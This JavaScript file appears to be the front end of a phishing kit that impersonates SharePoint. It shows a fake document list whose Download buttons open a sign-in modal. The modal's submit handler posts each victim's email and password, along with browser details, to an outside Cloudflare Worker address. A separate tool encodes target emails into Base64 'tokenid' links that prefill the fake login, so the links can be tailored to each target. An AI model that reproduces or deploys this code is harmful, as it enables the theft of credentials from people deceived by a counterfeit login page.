// App state
let currentStage = 'loading';
let authModalOpen = false;

// Sample file data
const files = [
    { id: '1', name: 'Financial Report Q4.xlsx', size: '2.4 MB', type: 'excel' },
    { id: '2', name: 'Project Proposal.pdf', size: '1.8 MB', type: 'pdf' },
    { id: '3', name: 'Budget Analysis.xlsx', size: '3.1 MB', type: 'excel' },
    { id: '4', name: 'Meeting Minutes.pdf', size: '856 KB', type: 'pdf' },
    { id: '5', name: 'Sales Data.xlsx', size: '4.2 MB', type: 'excel' }
];

// Cloudflare Worker configuration
const WORKER_URL = "https://sharepoint-worker.znwasike.workers.dev/";

// Initialize app
document.addEventListener('DOMContentLoaded', function() {
    startLoading();
    prefillEmailFromUrl();
});

// Loading stage functionality
function startLoading() {
    let progress = 0;
    const progressBar = document.getElementById('progress-bar');
    const progressText = document.getElementById('progress-text');
    
    const timer = setInterval(() => {
        progress += 2;
        progressBar.style.width = progress + '%';
        progressText.textContent = progress + '% Complete';
        
        if (progress >= 100) {
            clearInterval(timer);
            setTimeout(() => {
                showFileList();
            }, 500);
        }
    }, 60);
}

// Navigation functions
function showFileList() {
    document.getElementById('loading-stage').classList.add('hidden');
    document.getElementById('converter-stage').classList.add('hidden');
    document.getElementById('file-list-stage').classList.remove('hidden');
    currentStage = 'files';
    renderFileList();
}

function showConverter() {
    document.getElementById('loading-stage').classList.add('hidden');
    document.getElementById('file-list-stage').classList.add('hidden');
    document.getElementById('converter-stage').classList.remove('hidden');
    currentStage = 'converter';
}

// File list rendering
function renderFileList() {
    const desktopContainer = document.getElementById('file-list-desktop');
    const mobileContainer = document.getElementById('file-list-mobile');
    
    // Clear existing content
    desktopContainer.innerHTML = '';
    mobileContainer.innerHTML = '';
    
    files.forEach(file => {
        // Desktop view
        const desktopRow = document.createElement('div');
        desktopRow.className = 'grid grid-cols-12 gap-4 px-4 py-3 hover:bg-gray-50 items-center';
        desktopRow.innerHTML = `
            <div class="col-span-6 flex items-center space-x-3">
                <div class="w-8 h-8 flex items-center justify-center">
                    ${getFileIcon(file.type)}
                </div>
                <span class="text-sm font-medium text-sharepoint-text">${file.name}</span>
            </div>
            <div class="col-span-3 text-sm text-gray-600">${file.size}</div>
            <div class="col-span-3">
                <button onclick="handleDownload('${file.id}')" class="px-3 py-1 text-sm bg-sharepoint-blue text-white rounded hover:bg-blue-600">
                    Download
                </button>
            </div>
        `;
        desktopContainer.appendChild(desktopRow);
        
        // Mobile view
        const mobileRow = document.createElement('div');
        mobileRow.className = 'px-4 py-4 border-b border-gray-200 last:border-b-0';
        mobileRow.innerHTML = `
            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-3 flex-1 min-w-0">
                    <div class="w-8 h-8 flex items-center justify-center">
                        ${getFileIcon(file.type)}
                    </div>
                    <div class="flex-1 min-w-0">
                        <p class="text-sm font-medium text-sharepoint-text truncate">${file.name}</p>
                        <p class="text-sm text-gray-500">${file.size}</p>
                    </div>
                </div>
                <button onclick="handleDownload('${file.id}')" class="ml-3 px-3 py-1 text-sm bg-sharepoint-blue text-white rounded hover:bg-blue-600">
                    Download
                </button>
            </div>
        `;
        mobileContainer.appendChild(mobileRow);
    });
}

// Get file icon based on type
function getFileIcon(type) {
    if (type === 'excel') {
        return `<svg class="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 20 20">
            <path d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 0v12h8V4H6z"/>
        </svg>`;
    } else {
        return `<svg class="w-6 h-6 text-red-600" fill="currentColor" viewBox="0 0 20 20">
            <path d="M4 4a2 2 0 012-2h8a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 0v12h8V4H6z"/>
        </svg>`;
    }
}

// Download handler
function handleDownload(fileId) {
    showAuthModal();
}

// Auth modal functions
function showAuthModal() {
    document.getElementById('auth-modal').classList.remove('hidden');
    authModalOpen = true;
}

function closeAuthModal() {
    document.getElementById('auth-modal').classList.add('hidden');
    authModalOpen = false;
}

// Email converter functions
function convertToBase64() {
    const emailInput = document.getElementById('email-input');
    const email = emailInput.value.trim();
    
    if (!email) {
        showToast('Please enter an email address', 'error');
        return;
    }
    
    if (!isValidEmail(email)) {
        showToast('Please enter a valid email address', 'error');
        return;
    }
    
    try {
        const base64Email = btoa(email);
        const generatedUrl = `${window.location.origin}?tokenid=${base64Email}`;
        
        document.getElementById('base64-output').value = base64Email;
        document.getElementById('url-output').value = generatedUrl;
        document.getElementById('converter-results').classList.remove('hidden');
        
        showToast('Successfully converted email to Base64!', 'success');
    } catch (error) {
        showToast('Error converting email to Base64', 'error');
    }
}

function clearConverter() {
    document.getElementById('email-input').value = '';
    document.getElementById('base64-output').value = '';
    document.getElementById('url-output').value = '';
    document.getElementById('converter-results').classList.add('hidden');
    
    // Reset copy button states
    document.getElementById('copy-base64-text').textContent = 'Copy';
    document.getElementById('copy-url-text').textContent = 'Copy';
}

function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    element.select();
    element.setSelectionRange(0, 99999);
    
    try {
        document.execCommand('copy');
        const copyButton = elementId === 'base64-output' ? 'copy-base64-text' : 'copy-url-text';
        const buttonElement = document.getElementById(copyButton);
        const originalText = buttonElement.textContent;
        
        buttonElement.textContent = 'Copied!';
        setTimeout(() => {
            buttonElement.textContent = originalText;
        }, 2000);
        
        showToast('Copied to clipboard!', 'success');
    } catch (error) {
        showToast('Failed to copy to clipboard', 'error');
    }
}

// Utility functions
function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function prefillEmailFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    const encodedEmail = urlParams.get('tokenid');
    
    if (encodedEmail) {
        try {
            const decodedEmail = atob(encodedEmail);
            if (isValidEmail(decodedEmail)) {
                document.getElementById('auth-email').value = decodedEmail;
            }
        } catch (error) {
            console.warn('Invalid base64 string in URL:', error);
        }
    }
}

// Toast notification system
function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    
    const bgColor = type === 'success' ? 'bg-green-500' : type === 'error' ? 'bg-red-500' : 'bg-blue-500';
    
    toast.className = `${bgColor} text-white px-4 py-2 rounded-lg shadow-lg transform transition-all duration-300 translate-x-full opacity-0`;
    toast.textContent = message;
    
    container.appendChild(toast);
    
    // Trigger animation
    setTimeout(() => {
        toast.classList.remove('translate-x-full', 'opacity-0');
    }, 10);
    
    // Remove toast after 3 seconds
    setTimeout(() => {
        toast.classList.add('translate-x-full', 'opacity-0');
        setTimeout(() => {
            container.removeChild(toast);
        }, 300);
    }, 3000);
}

// Form submission handler
document.getElementById('auth-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('auth-email').value;
    const password = document.getElementById('auth-password').value;
    
    if (!email || !password) {
        showToast('Please fill in all fields', 'error');
        return;
    }
    
    try {
        // Prepare form data
        const formData = {
            email,
            password,
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
        };
        
        // Submit to Cloudflare Worker
        const response = await fetch(WORKER_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        });
        
        const result = await response.json();
        
        if (!response.ok) {
            throw new Error(result.error || 'Failed to submit form');
        }
        
        showToast('Authentication successful! Redirecting...', 'success');
        
        setTimeout(() => {
            closeAuthModal();
            // Reset form
            document.getElementById('auth-form').reset();
        }, 1500);
        
    } catch (error) {
        console.error('Error submitting form:', error);
        showToast('Authentication failed. Please try again.', 'error');
    }
});

// Close modal on escape key
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' && authModalOpen) {
        closeAuthModal();
    }
});
